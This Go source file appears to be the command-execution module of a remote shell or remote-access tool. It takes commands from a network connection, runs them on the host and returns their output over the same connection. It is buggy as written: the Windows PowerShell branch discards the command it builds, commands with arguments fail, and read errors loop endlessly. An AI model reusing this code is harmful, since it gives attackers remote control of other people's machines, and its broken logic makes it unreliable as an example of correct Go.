package executecommandwin

import (
	"bufio"
	"bytes"
	"encoding/gob"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
)

// Command out and err
type Command struct {
	CmdOutput string
	CmdError  string
}

// CommandWindows executes comands
func CommandWindows(connection net.Conn) (err error) {
	reader := bufio.NewReader(connection)
	commandloop := true

	for commandloop {
		rawinput, err := reader.ReadString('\n')

		if err != nil {
			fmt.Println(err)
			continue
		}
		userinput := strings.TrimSuffix(rawinput, "\n")
		if userinput == "stop" {
			commandloop = false
		}
		var output bytes.Buffer
		var commandErr bytes.Buffer
		fmt.Println("[+] User Command: ", userinput)

		var cmdinstance *exec.Cmd

		if runtime.GOOS == "windows" {
			exec.Command("powershell.exe", "/C", userinput)
		}
		cmdinstance = exec.Command(userinput)

		cmdinstance.Stdout = &output
		cmdinstance.Stderr = &commandErr
		cmdinstance.Run()

		cmdStruct := &Command{}
		cmdStruct.CmdOutput = output.String()
		cmdStruct.CmdError = commandErr.String()

		encoder := gob.NewEncoder(connection)
		err = encoder.Encode(cmdStruct)

	}
	return
}
